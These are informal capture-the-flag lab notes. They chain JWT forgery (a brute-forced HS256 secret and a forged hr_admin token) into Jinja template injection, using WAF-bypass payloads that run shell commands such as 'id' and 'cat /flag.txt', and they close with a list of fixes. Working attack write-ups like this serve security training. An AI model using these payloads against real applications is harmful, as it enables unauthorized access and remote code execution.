first we map the website using burpsuite
the login functionallity
request : 
{"username":"alice","password":"Password123"}

Response : 
Base64 JWT token : {"alg":"HS256","typ":"JWT"}.{"sub":"alice","role":"employee"}.ëOÆd*wvB-_9®y´ñ#Ñ'÷gç%yx`

its HS256 algrithm we can try  "alg" : "none" or brute force the secret using rockyou.txt
trying with : {"alg":"none","typ":"JWT"}.{"sub":"alice","role":"hr_admin"}
didnt work ... 
lets try brute_forcing the secret key
writing the python code
i can copy the old one from lab8 and just make some changes
we can also verify it works using the GET /api/me endpoint
found it , 
its : chocolate 
now generating the token with the role : hr_admin
cool we got the hr_admin role
injecting it in the browser: 
const myToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJocl9hZG1pbiJ9.XnLHbhNFW6GKxiFhIVh8axamHJQ48JhcBLXk1eydJOg";
localStorage.setItem("token", myToken);
localStorage.setItem("nimbus_token", myToken);

Now i see the template page
its SSTI 
ez
lets test : 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
'mro' is blocked? 
os , exec are also blocked
lets search on web for WAF Bypass
found it !!
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("id").read() }} worked ...
lsit root dir : 
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("ls /").read() }}
i can see it flag.txt
cat it 
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("cat /flag.txt").read() }}
done :  FLAG{jwt_1dor_filt3r3d_sst1_full_ch41n_pwn}
Now securing the code
1_Importing the safe jinja library and functions
2_fixing the UnAuthourized Access in the /api/me (Logic Error)
3_Fixing the IDOR/BOLA in the /api/users/uid
4_Fixing the SSTI in the /admin/reports/render endpoint 
done
